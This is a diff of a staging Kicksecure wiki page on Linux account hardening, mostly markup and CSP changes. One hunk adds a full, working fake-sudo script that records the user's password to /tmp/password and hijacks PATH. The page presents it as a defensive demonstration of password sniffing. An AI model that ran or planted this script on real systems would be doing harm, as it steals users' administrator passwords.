@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" data-sn-id="38">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta http-equiv="content-security-policy" content="default-src 'none'; script-src 'self' 'sha256-CfNaB52bngqEHx7jciumppsSI2ETl8okuB+c5yVEAL4='; style-src 'self'; img-src 'self' data:; font-src 'self'; media-src 'self'; manifest-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; worker-src 'self'; require-trusted-types-for 'script'">
+<meta http-equiv="content-security-policy" content="default-src 'none'; script-src 'self' 'sha256-/EIM37O72cJgw3uUn5Mj0uAwPs+uoIinE4FkmT5B+bg='; style-src 'self'; img-src 'self' data:; font-src 'self'; media-src 'self'; manifest-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; worker-src 'self'; require-trusted-types-for 'script'">
 <meta name="robots" content="noindex,nofollow">
 <title>Strong Linux User Account Isolation</title>
 <meta name="description" content="Protect Linux User Accounts against Brute Force Attacks, Administrative (&quot;Root&quot;) Account Locking, Console Lockdown, sudo password sniffing, X Windows System / Wayland Password Sniffing, /proc/pid/sched spy on keystrokes, Linux user account cracking, pam_faillock, pam-tally2, pam-cracklib, /etc/securetty">
@@ -14,7 +14,7 @@
 <meta property="og:image" content="https://www.kicksecure.com/media/orig/Useraccountisolatiom123123.jpg">
 <link rel="stylesheet" href="../../../style.css">
 <link rel="stylesheet" href="../../../fontawesome/css/all.min.css">
-<script>(function(){try{var t=localStorage.getItem('theme');if(t==='dark'||(!t&&matchMedia('(prefers-color-scheme:dark)').matches))document.documentElement.setAttribute('data-theme','dark');}catch(e){}})();</script>
+<script>(function(){try{var d=document.documentElement,L=localStorage,t=L.getItem('theme');if(t==='dark'||(!t&&matchMedia('(prefers-color-scheme:dark)').matches))d.setAttribute('data-theme','dark');if(L.getItem('legal-agreement-banner-dismissed')==='1')d.classList.add('legal-ack-hidden');var s=d.getAttribute('data-sn-id');if(s&&L.getItem('sitenotice-dismissed')===s)d.classList.add('sitenotice-hidden');}catch(e){}})();</script>
 </head>
 <body>
 <div class="stage-banner" role="alert"><strong>Staging server.</strong> This is a preview of Kicksecure content -- it may be incomplete or unreleased and is not the production website.</div>
@@ -536,10 +536,11 @@ depends on the tools processing it.</li>
 tools to "log in" as <code>root</code>. Commands such as
 <code>sudo su</code> remain functional.</li>
 <li><strong>SSH-based logins:</strong> User accounts locked using
-<span class="code-select inline-style">sudo passwd --lock root</span>
-are not necessarily banned from logging in. Behavior depends on the
-specific <a href="../../SSH/">SSH</a> configuration. This is
-documented in wiki chapter <a href="../../SSH/#SSH_Login_Comparison_Table">SSH Login Comparison Table</a>.</li>
+<span class="code-select inline-style" data-code="sudo passwd --lock root">sudo
+passwd --lock root</span> are not necessarily banned from logging in.
+Behavior depends on the specific <a href="../../SSH/">SSH</a>
+configuration. This is documented in wiki chapter <a href="../../SSH/#SSH_Login_Comparison_Table">SSH Login
+Comparison Table</a>.</li>
 <li><strong>See also:</strong> <a href="../../User/#Meanings_of_Special_Characters_in_the_Password_Field_of_.2Fetc.2Fshadow_File">Meanings of Special Characters in the Password Field of
 /etc/shadow File</a>.</li>
 </ul></li>
@@ -563,7 +564,8 @@ attempts, thanks to the <code>faillock</code> implementation by <a href="../../S
 <a href="https://github.com/Kicksecure/dist-base-files/blob/master/debian/dist-base-files.postinst"><code>debian/postinst</code>
 maintainer script</a><sup class="ext-link-to-archive has-sibling" title="Link to archived version on web.archive.org"><a rel="noreferrer noopener" target="_blank" href="https://web.archive.org/web/https://github.com/Kicksecure/dist-base-files/blob/master/debian/dist-base-files.postinst" aria-label="Archived version on web.archive.org"><i class="fa-solid fa-box-archive"></i></a></sup> in function <code>lock_root_account</code>. The
 effectively executed command is
-<span class="code-select inline-style">passwd --lock root</span> .</li>
+<span class="code-select inline-style" data-code="passwd --lock root">passwd
+--lock root</span> .</li>
 <li><span class="github-link-widget"><img src="../../../github-mark.svg" width="14" height="16" alt="GitHub Logo" /><a href="https://github.com/Kicksecure/security-misc/blob/master/usr/share/pam-configs/pam-abort-on-locked-password-security-misc">Kicksecure/security-misc</a><sup class="ext-link-to-archive has-sibling" title="Link to archived version on web.archive.org"><a rel="noreferrer noopener" target="_blank" href="https://web.archive.org/web/https://github.com/Kicksecure/security-misc/blob/master/usr/share/pam-configs/pam-abort-on-locked-password-security-misc" aria-label="Archived version on web.archive.org"><i class="fa-solid fa-box-archive"></i></a></sup></span></li>
 <li><span class="github-link-widget"><img src="../../../github-mark.svg" width="14" height="16" alt="GitHub Logo" /><a href="https://github.com/Kicksecure/security-misc/blob/master/usr/libexec/security-misc/pam-abort-on-locked-password">Kicksecure/security-misc</a><sup class="ext-link-to-archive has-sibling" title="Link to archived version on web.archive.org"><a rel="noreferrer noopener" target="_blank" href="https://web.archive.org/web/https://github.com/Kicksecure/security-misc/blob/master/usr/libexec/security-misc/pam-abort-on-locked-password" aria-label="Archived version on web.archive.org"><i class="fa-solid fa-box-archive"></i></a></sup></span></li>
 </ul>
@@ -1228,7 +1230,20 @@ Linux. One example is:</p>
 <p>An attacker can set up a fake <code>sudo</code> binary to trick the
 user into providing their password. Below is a simple example attack
 implementation demonstrating how this could be accomplished:</p>
-<p><span class="code-select">cat &lt;&lt;\EOF &gt; /tmp/sudo</p>
+<p><span class="code-select" data-code="cat &lt;&lt;\EOF &gt; /tmp/sudo
+#!/bin/bash
+if [[ &quot;${@}&quot; = &quot;&quot; ]]; then
+  /usr/bin/sudo
+else
+  read -r -p &quot;[sudo] password for user: &quot; password
+  echo &quot;${password}&quot; &gt; /tmp/password
+  echo &quot;Sorry, try again.&quot;
+  /usr/bin/sudo ${@}
+fi
+EOF
+chmod +x /tmp/sudo
+export PATH=&quot;/tmp:${PATH}&quot;">cat &lt;&lt;\EOF &gt;
+/tmp/sudo</p>
 <ol>
 <li>!/bin/bash</li>
 </ol>
@@ -1245,8 +1260,10 @@ implementation demonstrating how this could be accomplished:</p>
 further, but that is beside the point being made here.</p>
 <p>Even specifying the file path of the real <code>sudo</code> binary
 would not work:</p>
-<p><span class="code-select">function /usr/bin/sudo { echo "Doesn't
-work"; } function /bin/sudo { echo "Doesn't work"; }</span></p>
+<p><span class="code-select" data-code="function /usr/bin/sudo { echo &quot;Doesn&#x27;t work&quot;; }
+function /bin/sudo { echo &quot;Doesn&#x27;t work&quot;; }">function
+/usr/bin/sudo { echo "Doesn't work"; } function /bin/sudo { echo
+"Doesn't work"; }</span></p>
 <p><strong>Non-Solutions:</strong></p>
 <ul>
 <li><strong><a href="../../Noexec/">noexec</a></strong>:
